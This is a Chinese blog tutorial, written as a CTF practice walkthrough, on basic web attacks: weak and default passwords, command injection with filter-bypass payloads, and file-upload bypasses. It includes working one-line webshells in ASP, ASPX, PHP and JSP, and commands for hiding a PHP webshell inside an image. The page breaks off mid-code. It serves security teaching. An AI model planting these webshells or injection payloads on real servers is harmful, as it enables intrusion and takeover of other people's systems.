@@ -1,0 +1,1602 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="常见WEB攻击基础解读, ITBOY">
+    <meta name="description" content="一位不爱洗头，爱开发的安全、运维工作者">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>常见WEB攻击基础解读 | ITBOY</title>
+    <link rel="icon" type="image/png" href="https://cdn.jsdelivr.net/gh/itboy-chencf/itboy-chencf.github.io/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/itboy-chencf/itboy-chencf.github.io/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/itboy-chencf/itboy-chencf.github.io/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/itboy-chencf/itboy-chencf.github.io/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/itboy-chencf/itboy-chencf.github.io/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/itboy-chencf/itboy-chencf.github.io/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="https://cdn.jsdelivr.net/gh/itboy-chencf/itboy-chencf.github.io/libs/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="ITBOY" type="application/atom+xml">
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="https://cdn.jsdelivr.net/gh/itboy-chencf/itboy-chencf.github.io/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">ITBOY</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>移步大佬</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="https://cdn.jsdelivr.net/gh/itboy-chencf/itboy-chencf.github.io/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">ITBOY</div>
+        <div class="logo-desc">
+            
+            一位不爱洗头，爱开发的安全、运维工作者
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			移步大佬
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://itboy-chencf.github.io/" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://itboy-chencf.github.io/" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+   
+</a>
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background: linear-gradient(to right,#8a68fd 0%,#44b1ec  100%);color: transparent;">
+
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">常见WEB攻击基础解读</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/itboy-chencf/itboy-chencf.github.io/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        height: calc(100vh - 250px);
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/CTF/">
+                                <span class="chip bg-color">CTF</span>
+                            </a>
+                        
+                            <a href="/tags/Web/">
+                                <span class="chip bg-color">Web</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" class="post-category">
+                                网络安全
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2020-08-24
+                </div>
+                
+
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    3.8k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    14 分
+                </div>
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Web 安全的对于 Web 从业人员来说是一个非常重要的课题 , 在这里也把自己培训学习内容进一步进行总结 Web 相关的安全攻防知识。</p>
+<h2 id="密码口令"><a href="#密码口令" class="headerlink" title="密码口令"></a>密码口令</h2><blockquote>
+<p>常见的弱口令问题且Web应用未做校验失败锁定方式，轻易使用密码爆破尝试。</p>
+</blockquote>
+<p>这里我通过在CTFHUP平台 (<a href="https://www.ctfhub.com/#/skilltree" target="_blank" rel="noopener">https://www.ctfhub.com/#/skilltree</a>)  中弱口令题目结合 Burp Suite模拟弱口令爆破。</p>
+<h3 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h3><figure class="half"> <img src="http://106.52.86.96/202008230000/image-20200804113314639.png" style="zoom: 50%;" />   <img src="http://106.52.86.96/202008230000/image-20200804113353200.png"  style="zoom:70%;" /></figure>
+
+<p>尝试猜测使用admin用户进行弱口令验证，使用简单弱口令集来进行爆破</p>
+<img src="http://106.52.86.96/202008230000/image-20200823120358320.png" style="zoom: 70%;" />
+
+<img src="http://106.52.86.96/202008230000/image-20200823121304362.png" style="zoom:70%;" />
+
+<p>通过密码爆破成功~</p>
+<figure class="half"><img src="http://106.52.86.96/202008230000/image-20200823121334961.png" style="zoom:40%;" /> <img src="http://106.52.86.96/202008230000/image-20200823122009252.png" style="zoom:40%;" /></figure>
+
+
+
+<h3 id="默认口令"><a href="#默认口令" class="headerlink" title="默认口令"></a>默认口令</h3><blockquote>
+<p>默认口令也是经常被大家忽略的一点，往往中、大型企业出厂默认初始化的密码，在网络上均能搜索的到，尝试使用默认口令密码就直接获得了管理员权限。</p>
+</blockquote>
+<p>题目中涉及 北京亿中邮信息技术有限公司的eyou邮件网关管理平台，通过网络查询相关平台文档获得默认口令，成功获得flag</p>
+<p><img src="http://106.52.86.96/202008230000/image-20200823123900760.png" alt=""></p>
+<img src="http://106.52.86.96/202008230000/image-20200823124401201.png" style="zoom: 70%;" />
+
+
+
+
+
+
+
+
+
+
+
+<h2 id="RCE攻击"><a href="#RCE攻击" class="headerlink" title="RCE攻击"></a>RCE攻击</h2><p>RCE (remote code execution) 远程代码执行，简称RCE漏洞，是指用户通过浏览器提交执行命令，由于服务器端没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令，可能会允许攻击者通过改变 $PATH 或程序执行环境的其他方面来执行一个恶意构造的代码</p>
+<h3 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h3><blockquote>
+<p>命令注入攻击最初被关注到是Shell命令注入攻击，由挪威一名程序员在1997年意外发现的，第一个命令注入攻击程序能随意地从一个网站删除网页，就像从本地磁盘删除文件一样简单；</p>
+</blockquote>
+<p>在黑客的世界，针对不同的软件系统，有各自特有的命令注入方式。命令注入攻击的常见场景为：仅仅需要输入数据的场合，攻击者构造数据同时输入了恶意命令代码，而系统对此并未过滤，恶意命令代码一并执行，最终导致信息泄露或者正常数据的破坏</p>
+<pre class=" language-bash"><code class="language-bash">常见命令执行连接符
+A<span class="token punctuation">;</span>B      <span class="token comment" spellcheck="true">#简单拼接，AB之间无制约条件</span>
+A<span class="token operator">&amp;</span>B      <span class="token comment" spellcheck="true">#简单拼接，AB之间无制约条件</span>
+A<span class="token operator">&amp;&amp;</span>B     <span class="token comment" spellcheck="true">#A执行成功，然后执行B</span>
+A<span class="token operator">|</span>B      <span class="token comment" spellcheck="true">#A的输出，作为B的输入</span>
+A<span class="token operator">||</span>B     <span class="token comment" spellcheck="true">#A的执行失败，然后再执行B</span>
+%0a      <span class="token comment" spellcheck="true">#换行符</span></code></pre>
+<img src="http://106.52.86.96/202008230000/image-20200823131601360.png" style="zoom: 67%;" />
+
+<p>接下来我们继续在靶场 <strong><code>ctfhub</code></strong> 中进行模拟尝试简单的的命令注入题</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token variable">$res</span> <span class="token operator">=</span> <span class="token constant">FALSE</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+  <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token string">"ping -c 4 {$_GET['ip']}"</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//通过GET请求获取IP执行ping命令，未进行任何的过滤校验</span>
+  <span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">,</span> <span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token comment" spellcheck="true">//执行命令回显结果</span>
+<span class="token punctuation">}</span>
+<span class="token delimiter">?></span></code></pre>
+<figure class="half"><img src="http://106.52.86.96/202008230000/image-20200823130245562.png" style="zoom:40%;" /><img src="http://106.52.86.96/202008230000/image-20200823130406094.png" style="zoom:40%;" /></figure>
+
+
+
+<p>接下来我们继续在靶场 <strong><code>ctfhub</code></strong> 中进行其他一道命令注入题，这道题已经涉及了各种过滤方式。</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token variable">$res</span> <span class="token operator">=</span> <span class="token constant">FALSE</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token variable">$m</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token string">"/(\||&amp;|;| |\/|cat|flag|ctfhub)/"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token variable">$m</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">//过滤cat、flag、；、||空格 等等</span>
+        <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token string">"ping -c 4 {$ip}"</span><span class="token punctuation">;</span>
+        <span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">,</span> <span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+        <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$m</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span class="token delimiter">?></span></code></pre>
+<img src="http://106.52.86.96/202008230000/image-20200823142258906.png"  style="zoom:67%;" />
+
+<p>常见命令拼接均已被限制过滤，现在可以考虑使用URL编码绕过方式，使用<strong><code>%0a</code></strong>换行符来来替||拼接，在bash中IFS是内部的域分隔符，使用<strong><code>${IFS}</code></strong>来代替空格，由于flag关键字也被过滤，可以使用<strong><code>*</code></strong>来匹配文件，方式多种多样都可以尝试。cat可以使用ca\t或者ca’’t等多种方式。  URL编码 参考 <a href="https://www.w3school.com.cn/tags/html_ref_urlencode.html" target="_blank" rel="noopener">https://www.w3school.com.cn/tags/html_ref_urlencode.html</a></p>
+<img src="http://106.52.86.96/202008230000/image-20200823141858774.png"  style="zoom:67%;" />
+
+<pre class=" language-html"><code class="language-html">?ip=127.0.0.1%0als%0acd${IFS}*_is_here%0als%0aca\t${IFS}\*_285661578716699.php
+#内容解读
+#127.0.0.1%0a 
+#ls%0a 
+#cd${IFS}*_is_here%0a 
+#ca\t${IFS}\*_285661578716699.php
+#执行最终得到flag</code></pre>
+<img src="http://106.52.86.96/202008230000/image-20200823143206336.png"  style="zoom:67%;" />
+
+
+
+<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h4 id="文件上传漏洞简介"><a href="#文件上传漏洞简介" class="headerlink" title="文件上传漏洞简介"></a>文件上传漏洞简介</h4><p>现代互联网的Web应用程序中，上传文件是⼀种常见的功能，因为它有助于提高业务效率，比如企业的 OA 系统，允许用户上传图片、视频、头像和许多其他类的文件。然而向用户提供的功能越多，Web应用受到攻击的风险就越大，如果Web应用存在文件上传漏洞，那么恶意用户就可以利用文件上传漏洞将可执行脚本程序（WebShell）上传到服务器中，获得网站的权限，然后可以进⼀步对服务器进行入侵，扩大控制权限。</p>
+<h3 id="漏洞产生原因"><a href="#漏洞产生原因" class="headerlink" title="漏洞产生原因"></a>漏洞产生原因</h3><p>上传文件时，如果服务端代码没有对客户端上传的⽂件进行严格的验证和过滤， 就容易造成可以上传任意文件的情况，包括上传脚本文件(asp、aspx、php、jsp等格式的文件)。</p>
+<h3 id="漏洞的危害"><a href="#漏洞的危害" class="headerlink" title="漏洞的危害"></a>漏洞的危害</h3><p>非法用户可以利用上传的恶意脚本文件控制整个网站，甚至控制服务器。这个恶意的脚本⽂件，又被称为WebShell脚本，具有非常强大的功能，比如查看服务器目录、服务器中的文件，执行系统命令等。</p>
+<p>WebShell 就是以 ASP、PHP、JSP 等网页脚本存在的⼀种命令执行环节，通常也叫做网页后门。攻击者在⼊侵了⼀个网站后，通常会将 WebShell 上传到网站的根目录下或者插⼊到正常的网页中，然后使用浏览器或者对应的 WebShell 客户端来访问这些后门，将会得到⼀个命令执行的环境，以达到控制网站服务器的目的。</p>
+<ul>
+<li>ASP</li>
+</ul>
+<pre class=" language-asp"><code class="language-asp"><%eval request("x")%>
+<%execute request("x")%></code></pre>
+<ul>
+<li>ASPX</li>
+</ul>
+<pre class=" language-asp"><code class="language-asp"><%@ Page Language=”Jscript”%><%eval(Request.Item["x"],”unsafe”);%></code></pre>
+<ul>
+<li>PHP</li>
+</ul>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'x'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token delimiter">?></span>
+<span class="token delimiter">&lt;?php</span> <span class="token function">assert</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'x'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter">?></span></code></pre>
+<ul>
+<li>JSP CMD WebShell</li>
+</ul>
+<pre class=" language-java"><code class="language-java"><span class="token operator">&lt;</span><span class="token operator">%</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">"x"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"pwd"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>InputStream in<span class="token operator">=</span>Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"i"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
+        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> b <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">byte</span><span class="token punctuation">[</span><span class="token number">2048</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"&lt;pre>"</span><span class="token punctuation">)</span>
+        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>a<span class="token operator">=</span>in<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
+        <span class="token punctuation">{</span>
+            out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"&lt;/pre>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token operator">%</span><span class="token operator">></span></code></pre>
+<p>在数情况下，要完成文件上传漏洞这个攻击，要满足如下几个条件：</p>
+<ul>
+<li>首先，上传的文件能够被 Web 容器解释执行。所以文件上传后所在的目录要是 Web 容器所覆盖到的路径。</li>
+<li>其次，用户能够从 Web 上访问这个文件。如果文件上传了，但用户无法通过 Web 访问，或者无法使得 Web容器解释这个脚本，那么也不能称之为漏洞。</li>
+<li>最后，用户上传的文件若被安全检查、格式化、图片压缩等功能改变了内容，则也可能导致攻击不成功。</li>
+</ul>
+<h3 id="案例演示"><a href="#案例演示" class="headerlink" title="案例演示"></a>案例演示</h3><p>通过CTF Hub</p>
+<ul>
+<li><p><strong>前端验证</strong></p>
+<p>修改调试参数，绕过文件后缀名校验，成功上传WebShell</p>
+<p><img src="http://106.52.86.96/202008230000/image-20200827211559251.png" alt=""></p>
+</li>
+</ul>
+<ul>
+<li><p><strong>.htaccess</strong></p>
+<p>htaccess 文件是 Apache 服务器中的⼀个配置文件，它负责相关目录下的相关配置。通过 htaccess 文件，可以帮我们实现：网页 301 重定向、子定义 404 错误页面、改变文件扩展名、允许/组织特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能</p>
+</li>
+</ul>
+<pre><code>AddType application/x-httpd-php .png</code></pre><p>​        这表示让 png 后缀的⽂件当做 PHP 来解析：</p>
+<p><img src="http://106.52.86.96/202008230000/image-20200902200255052.png" alt=""></p>
+<p>​    此时上传⼀个 png图片，但是图片内容是 PHP：</p>
+<p><img src="http://106.52.86.96/202008230000/image-20200902200527360.png" alt=""></p>
+<ul>
+<li><p><strong>MIME绕过</strong></p>
+<p>媒体类型（通常称为 Multipurpose Internet Mail Extensions 或 MIME 类型 ）是⼀种标准，用来表示文档、文件或字节流的性质和格式。本关直接修改 Content-Type 即可实现上传绕过</p>
+<p><img src="http://106.52.86.96/202008230000/image-20200831145549878.png" alt=""></p>
+</li>
+</ul>
+<ul>
+<li><p><strong>文件头检查</strong></p>
+<p>文件头检查只对文件头进行基本的校验：</p>
+<p>常见文件头:</p>
+<p><img src="http://106.52.86.96/202008230000/image-20200904114328143.png" alt=""></p>
+<p>可以通过WinHex工具查看文件16进制情况</p>
+<p><img src="http://106.52.86.96/202008230000/image-20200904114351873.png" alt=""></p>
+<p><img src="http://106.52.86.96/202008230000/image-20200904114407128.png" alt=""></p>
+<p>这里可以通过添加文件头的形式进行</p>
+</li>
+</ul>
+<p><img src="http://106.52.86.96/202008230000/image-20200904114942084.png" alt=""></p>
+<p>也可以通过制作图马进行绕过</p>
+<blockquote>
+<p>Windows</p>
+<p>参数 /b 指定以⼆进制格式复制、合并文件，用于图像类/声⾳类文件<br>参数 /a 指定以 ASCII 格式复制、合并文件，用于 txt 等文类文件</p>
+</blockquote>
+<pre><code>copy source.jpg/b+shell.php shell.jpg</code></pre><blockquote>
+<p>Linux</p>
+</blockquote>
+<pre><code>➜ Desktop ls
+pic.png shell.php
+
+# 拷⻉⼀个 shell.png ⽤于后⾯的操作
+➜ Desktop cp pic.png shell.png
+
+➜ Desktop ls
+pic.png shell.php shell.png
+
+# 查看⼀下 shell.php 内容
+➜ Desktop cat shell.php
+&lt;?php eval($_POST[&#39;x&#39;]) ?&gt;%
+
+# 将 shell.php 内容追加到 shell.png 中
+➜ Desktop cat shell.php &gt;&gt; shell.png</code></pre><p>手动查看⼀下，发现图片尾部已经存在 WebShell 木马了：</p>
+<p><img src="http://106.52.86.96/202008230000/image-20200904143108735.png" alt=""></p>
+<p>手生成的图马当然也是可以直接上传成功的。</p>
+<ul>
+<li><p>00截断</p>
+<ul>
+<li>谈到00截断我们都会想到，有什么0x00截断，%00截断，也有人对两个东西分析一大堆，那么它俩有什么区别呢，什么场合适用哪一个呢？这就要从00截断的原理说起：<br>其实截断的原理也很简单，无论0x00还是%00，最终被解析后都是一个东西:<strong>chr（0）</strong><br>chr()是一个函数，这个函数是用来返回参数所对应的字符的，也就是说，参数是一个ASCII码，返回的值是一个字符，类型为string。<br>那么chr(0)就很好理解了，对照ASCII码表可以知道，ASCII码为0-127的数字，每个数字对应一个字符，而0对应的就是NUT字符（NULL），也就是<strong>空字符</strong>，而截断的关键就是这个空字符，<strong>当一个字符串中存在空字符的时候，在被解析的时候会导致空字符后面的字符被丢弃</strong>。</li>
+<li>这种情况常出现在ASP程序中，PHP 版本&lt;5.3.4时也会有这个情况，JSP中也会出现。<br>那么就可以知道00截断的原理了，在后缀中插入一个空字符（不是空格），会导致之后的部分被丢弃，而导致绕过的发生。如：在文件1.php.jpg中插入空字符变成：1.php.0x00.jpg中，解析后就会只剩下1.php，而空字符怎么插入的呢？通常我们会用Burp抓包后，在文件名插入一个空格，然后再HEX中找到空格对应的16进制编码“20”，把它改成00（即16进制ASCII码00，对应十进制的0），就可以插入空字符了。<strong>PS:这里的空格纯粹只是一个标记符号，便于我们找到位置，其实这里是什么字符都无所谓，只不过空格比较有特异性，方便在HEX中查找位置</strong></li>
+</ul>
+<blockquote>
+<p>PHP 5.2 存在 00 截断漏洞，截断也可以用来突破上传后缀限制。发现存在路径参数，⼀般设计到路径参数的多，大多数可以通过 00 截断路径来突破上传限制。</p>
+</blockquote>
+<p><img src="http://106.52.86.96/202008230000/image-20200905163018816.png" alt=""></p>
+</li>
+</ul>
+<ul>
+<li><p>双写后缀</p>
+<p>可以看到上传功能的逻辑代码为：</p>
+<pre class=" language-php"><code class="language-php"><span class="token variable">$name</span> <span class="token operator">=</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
